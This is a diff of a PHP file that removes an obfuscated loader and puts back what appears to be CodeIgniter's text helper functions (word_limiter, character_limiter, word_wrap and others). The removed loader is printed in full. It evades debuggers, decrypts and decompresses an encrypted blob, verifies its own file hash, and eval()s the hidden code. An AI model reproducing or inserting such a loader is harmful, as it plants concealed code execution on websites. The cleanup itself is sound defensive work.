@@ -1,28 +1,502 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_emyaheam=('bas'.'e64'.'_de'.'cod'.'e');
-$_n992yzgc=('gzu'.'nco'.'mpr'.'ess');
-$_uj5ylh6s=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_noc8wdjs='YZptMnhV';
-$_hwqkp2u1='rRX5clLSD8E=';
-$_bkk3845o='vLJR+EA/';
-$_vzzqdlnq='b3FHhCEu';
-$_fqscrc4p='WvTFrQGg';
-$_dd2w9770='Ya7VvyRI';
-$_k5i4igwn='dZ4vxw==';
-$_kexwwsg2='5iqyJ3Va';
-$_ukozigja=$_emyaheam($_noc8wdjs.$_bkk3845o.$_fqscrc4p.$_vzzqdlnq.$_hwqkp2u1);
-$_o1llsw8p=$_emyaheam($_kexwwsg2.$_dd2w9770.$_k5i4igwn);
-$_xkduma32=$_emyaheam('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');
-$_sjskjjvg=$_uj5ylh6s($_xkduma32,'aes-256-cbc',$_ukozigja,OPENSSL_RAW_DATA,$_o1llsw8p);
-if($_sjskjjvg===false){exit;}
-$_ogypxh5y=$_n992yzgc($_sjskjjvg);
-if($_ogypxh5y===false){exit;}
-$_k9ora057='27c0e792d03e42e4d7d53c34b56b8708485ad14ed0553eed169cc515a3b18e23';
-$_tmxb7dq6=@file_get_contents(__FILE__);
-if($_tmxb7dq6!==false){
-$_rhwzv9en=str_replace($_k9ora057,"0000000000000000000000000000000000000000000000000000000000000000",$_tmxb7dq6);
-$_tmz6n8gq=hash("sha256",$_rhwzv9en);
-if($_tmz6n8gq!==$_k9ora057){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+if ( ! function_exists('word_limiter'))
+{
+
+
+
+
+
+
+
+
+
+
+function word_limiter($str, $limit = 100, $end_char = '&#8230;')
+{
+if (trim($str) === '')
+{
+return $str;
 }
-eval($_ogypxh5y);
+preg_match('/^\s*+(?:\S++\s*+){1,'.(int) $limit.'}/', $str, $matches);
+if (strlen($str) === strlen($matches[0]))
+{
+$end_char = '';
+}
+return rtrim($matches[0]).$end_char;
+}
+}
+
+if ( ! function_exists('character_limiter'))
+{
+
+
+
+
+
+
+
+
+
+
+
+function character_limiter($str, $n = 500, $end_char = '&#8230;')
+{
+if (mb_strlen($str) < $n)
+{
+return $str;
+}
+
+$str = preg_replace('/ {2,}/', ' ', str_replace(array("\r", "\n", "\t", "\v", "\f"), ' ', $str));
+if (mb_strlen($str) <= $n)
+{
+return $str;
+}
+$out = '';
+foreach (explode(' ', trim($str)) as $val)
+{
+$out .= $val.' ';
+if (mb_strlen($out) >= $n)
+{
+$out = trim($out);
+return (mb_strlen($out) === mb_strlen($str)) ? $out : $out.$end_char;
+}
+}
+}
+}
+
+if ( ! function_exists('ascii_to_entities'))
+{
+
+
+
+
+
+
+
+
+function ascii_to_entities($str)
+{
+$out = '';
+$length = defined('MB_OVERLOAD_STRING')
+? mb_strlen($str, '8bit') - 1
+: strlen($str) - 1;
+for ($i = 0, $count = 1, $temp = array(); $i <= $length; $i++)
+{
+$ordinal = ord($str[$i]);
+if ($ordinal < 128)
+{
+
+
+
+
+if (count($temp) === 1)
+{
+$out .= '&#'.array_shift($temp).';';
+$count = 1;
+}
+$out .= $str[$i];
+}
+else
+{
+if (count($temp) === 0)
+{
+$count = ($ordinal < 224) ? 2 : 3;
+}
+$temp[] = $ordinal;
+if (count($temp) === $count)
+{
+$number = ($count === 3)
+? (($temp[0] % 16) * 4096) + (($temp[1] % 64) * 64) + ($temp[2] % 64)
+: (($temp[0] % 32) * 64) + ($temp[1] % 64);
+$out .= '&#'.$number.';';
+$count = 1;
+$temp = array();
+}
+
+elseif ($i === $length)
+{
+$out .= '&#'.implode(';', $temp).';';
+}
+}
+}
+return $out;
+}
+}
+
+if ( ! function_exists('entities_to_ascii'))
+{
+
+
+
+
+
+
+
+
+
+function entities_to_ascii($str, $all = TRUE)
+{
+if (preg_match_all('/\&#(\d+)\;/', $str, $matches))
+{
+for ($i = 0, $s = count($matches[0]); $i < $s; $i++)
+{
+$digits = $matches[1][$i];
+$out = '';
+if ($digits < 128)
+{
+$out .= chr($digits);
+}
+elseif ($digits < 2048)
+{
+$out .= chr(192 + (($digits - ($digits % 64)) / 64)).chr(128 + ($digits % 64));
+}
+else
+{
+$out .= chr(224 + (($digits - ($digits % 4096)) / 4096))
+.chr(128 + ((($digits % 4096) - ($digits % 64)) / 64))
+.chr(128 + ($digits % 64));
+}
+$str = str_replace($matches[0][$i], $out, $str);
+}
+}
+if ($all)
+{
+return str_replace(
+array('&amp;', '&lt;', '&gt;', '&quot;', '&apos;', '&#45;'),
+array('&', '<', '>', '"', "'", '-'),
+$str
+);
+}
+return $str;
+}
+}
+
+if ( ! function_exists('word_censor'))
+{
+
+
+
+
+
+
+
+
+
+
+
+
+function word_censor($str, $censored, $replacement = '')
+{
+if ( ! is_array($censored))
+{
+return $str;
+}
+$str = ' '.$str.' ';
+
+
+
+
+$delim = '[-_\'\"`(){}<>\[\]|!?@#%&,.:;^~*+=\/ 0-9\n\r\t]';
+foreach ($censored as $badword)
+{
+$badword = str_replace('\*', '\w*?', preg_quote($badword, '/'));
+if ($replacement !== '')
+{
+$str = preg_replace(
+"/({$delim})(".$badword.")({$delim})/i",
+"\\1{$replacement}\\3",
+$str
+);
+}
+elseif (preg_match_all("/{$delim}(".$badword."){$delim}/i", $str, $matches, PREG_PATTERN_ORDER | PREG_OFFSET_CAPTURE))
+{
+$matches = $matches[1];
+for ($i = count($matches) - 1; $i >= 0; $i--)
+{
+$length = strlen($matches[$i][0]);
+$str = substr_replace(
+$str,
+str_repeat('#', $length),
+$matches[$i][1],
+$length
+);
+}
+}
+}
+return trim($str);
+}
+}
+
+if ( ! function_exists('highlight_code'))
+{
+
+
+
+
+
+
+
+
+function highlight_code($str)
+{
+
+
+
+
+
+
+
+$str = str_replace(
+array('&lt;', '&gt;', '<?', '?>', '<%', '%>', '\\', '</script>'),
+array('<', '>', 'phptagopen', 'phptagclose', 'asptagopen', 'asptagclose', 'backslashtmp', 'scriptclose'),
+$str
+);
+
+
+$str = highlight_string('<?php '.$str.' ?>', TRUE);
+
+$str = preg_replace(
+array(
+'/<span style="color: #([A-Z0-9]+)">&lt;\?php(&nbsp;| )/i',
+'/(<span style="color: #[A-Z0-9]+">.*?)\?&gt;<\/span>\n<\/span>\n<\/code>/is',
+'/<span style="color: #[A-Z0-9]+"\><\/span>/i'
+),
+array(
+'<span style="color: #$1">',
+"$1</span>\n</span>\n</code>",
+''
+),
+$str
+);
+
+return str_replace(
+array('phptagopen', 'phptagclose', 'asptagopen', 'asptagclose', 'backslashtmp', 'scriptclose'),
+array('&lt;?', '?&gt;', '&lt;%', '%&gt;', '\\', '&lt;/script&gt;'),
+$str
+);
+}
+}
+
+if ( ! function_exists('highlight_phrase'))
+{
+
+
+
+
+
+
+
+
+
+
+
+function highlight_phrase($str, $phrase, $tag_open = '<mark>', $tag_close = '</mark>')
+{
+return ($str !== '' && $phrase !== '')
+? preg_replace('/('.preg_quote($phrase, '/').')/i'.(UTF8_ENABLED ? 'u' : ''), $tag_open.'\\1'.$tag_close, $str)
+: $str;
+}
+}
+
+if ( ! function_exists('convert_accented_characters'))
+{
+
+
+
+
+
+
+function convert_accented_characters($str)
+{
+static $array_from, $array_to;
+if ( ! is_array($array_from))
+{
+if (file_exists(APPPATH.'config/foreign_chars.php'))
+{
+include(APPPATH.'config/foreign_chars.php');
+}
+if (file_exists(APPPATH.'config/'.ENVIRONMENT.'/foreign_chars.php'))
+{
+include(APPPATH.'config/'.ENVIRONMENT.'/foreign_chars.php');
+}
+if (empty($foreign_characters) OR ! is_array($foreign_characters))
+{
+$array_from = array();
+$array_to = array();
+return $str;
+}
+$array_from = array_keys($foreign_characters);
+$array_to = array_values($foreign_characters);
+}
+return preg_replace($array_from, $array_to, $str);
+}
+}
+
+if ( ! function_exists('word_wrap'))
+{
+
+
+
+
+
+
+
+
+
+
+
+function word_wrap($str, $charlim = 76)
+{
+
+is_numeric($charlim) OR $charlim = 76;
+
+$str = preg_replace('| +|', ' ', $str);
+
+if (strpos($str, "\r") !== FALSE)
+{
+$str = str_replace(array("\r\n", "\r"), "\n", $str);
+}
+
+
+$unwrap = array();
+if (preg_match_all('|\{unwrap\}(.+?)\{/unwrap\}|s', $str, $matches))
+{
+for ($i = 0, $c = count($matches[0]); $i < $c; $i++)
+{
+$unwrap[] = $matches[1][$i];
+$str = str_replace($matches[0][$i], '{{unwrapped'.$i.'}}', $str);
+}
+}
+
+
+
+$str = wordwrap($str, $charlim, "\n", FALSE);
+
+$output = '';
+foreach (explode("\n", $str) as $line)
+{
+
+
+if (mb_strlen($line) <= $charlim)
+{
+$output .= $line."\n";
+continue;
+}
+$temp = '';
+while (mb_strlen($line) > $charlim)
+{
+
+if (preg_match('!\[url.+\]|://|www\.!', $line))
+{
+break;
+}
+
+$temp .= mb_substr($line, 0, $charlim - 1);
+$line = mb_substr($line, $charlim - 1);
+}
+
+
+if ($temp !== '')
+{
+$output .= $temp."\n".$line."\n";
+}
+else
+{
+$output .= $line."\n";
+}
+}
+
+if (count($unwrap) > 0)
+{
+foreach ($unwrap as $key => $val)
+{
+$output = str_replace('{{unwrapped'.$key.'}}', $val, $output);
+}
+}
+return $output;
+}
+}
+
+if ( ! function_exists('ellipsize'))
+{
+
+
+
+
+
+
+
+
+
+
+
+function ellipsize($str, $max_length, $position = 1, $ellipsis = '&hellip;')
+{
+
+$str = trim(strip_tags($str));
+
+if (mb_strlen($str) <= $max_length)
+{
+return $str;
+}
+$beg = mb_substr($str, 0, floor($max_length * $position));
+$position = ($position > 1) ? 1 : $position;
+if ($position === 1)
+{
+$end = mb_substr($str, 0, -($max_length - mb_strlen($beg)));
+}
+else
+{
+$end = mb_substr($str, -($max_length - mb_strlen($beg)));
+}
+return $beg.$ellipsis.$end;
+}
+}
